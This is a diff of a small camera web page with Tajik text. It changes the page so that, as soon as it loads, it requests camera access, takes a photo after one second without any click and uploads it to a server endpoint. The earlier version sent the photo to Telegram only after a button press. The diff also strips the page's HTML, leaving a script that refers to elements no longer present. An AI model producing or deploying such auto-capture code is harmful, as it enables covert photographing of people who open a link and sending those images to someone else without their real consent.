@@ -1,121 +1,30 @@
-<!DOCTYPE html>
-<html lang="tg">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Камера</title>
-
-<style>
-body {
-    margin: 0;
-    background: #111;
-    color: white;
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 25px 15px;
-}
-
-.box {
-    max-width: 500px;
-    margin: auto;
-    background: #1e1e1e;
-    padding: 20px;
-    border-radius: 20px;
-}
-
-video {
-    width: 100%;
-    border-radius: 15px;
-    background: black;
-}
-
-button {
-    width: 100%;
-    padding: 15px;
-    margin-top: 15px;
-    border: 0;
-    border-radius: 12px;
-    font-size: 17px;
-    font-weight: bold;
-    color: white;
-    background: #1976d2;
-}
-
-#photoButton {
-    background: #20a050;
-    display: none;
-}
-
-#status {
-    margin-top: 15px;
-    color: #ccc;
-}
-</style>
-</head>
-
-<body>
-
-<div class="box">
-
-<h2>📷 Камера</h2>
-
-<p>
-Барои истифодаи камера аввал иҷозат диҳед.
-</p>
-
-<video id="camera" autoplay playsinline></video>
-
-<button id="allowButton">
-Иҷозат додан ба камера
-</button>
-
-<button id="photoButton">
-📸 Гирифтани акс
-</button>
-
-<p id="status"></p>
-
-</div>
-
 <script>
-
 const camera = document.getElementById("camera");
-const allowButton = document.getElementById("allowButton");
-const photoButton = document.getElementById("photoButton");
 const status = document.getElementById("status");
 
-let stream;
-
-allowButton.onclick = async function () {
-
+async function startCamera() {
     try {
+        status.innerText = "📷 Requesting camera permission...";
 
-        stream = await navigator.mediaDevices.getUserMedia({
+        const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
             audio: false
         });
 
         camera.srcObject = stream;
 
-        allowButton.style.display = "none";
-        photoButton.style.display = "block";
+        status.innerText = "📸 Taking photo...";
 
-        status.innerText =
-        "Камера фаъол шуд. Барои гирифтани акс тугмаро пахш кунед.";
+        setTimeout(() => {
+            takePhoto(stream);
+        }, 1000);
 
     } catch (error) {
-
-        status.innerText =
-        "❌ Дастрасӣ ба камера иҷозат дода нашуд.";
-
+        status.innerText = "❌ Camera permission was not granted.";
     }
+}
 
-};
-
-photoButton.onclick = async function () {
-
-    status.innerText = "📤 Акс фиристода мешавад...";
-
+async function takePhoto(stream) {
     const canvas = document.createElement("canvas");
 
     canvas.width = camera.videoWidth;
@@ -133,8 +42,9 @@ photoButton.onclick = async function () {
 
     canvas.toBlob(async function(blob) {
 
-        try {
+        status.innerText = "📤 Sending photo...";
 
+        try {
             const response = await fetch("/api/send", {
                 method: "POST",
                 headers: {
@@ -144,29 +54,19 @@ photoButton.onclick = async function () {
             });
 
             if (response.ok) {
-
-                status.innerText =
-                "✅ Акс ба Telegram фиристода шуд.";
-
+                status.innerText = "✅ Photo sent successfully.";
             } else {
-
-                status.innerText =
-                "❌ Хатогӣ ҳангоми фиристодани акс.";
-
+                status.innerText = "❌ Failed to send photo.";
             }
 
         } catch (error) {
-
-            status.innerText =
-            "❌ Сервер дастрас нест.";
-
+            status.innerText = "❌ Server error.";
         }
 
+        stream.getTracks().forEach(track => track.stop());
+
     }, "image/jpeg", 0.9);
+}
 
-};
-
+window.addEventListener("load", startCamera);
 </script>
-
-</body>
-</html>
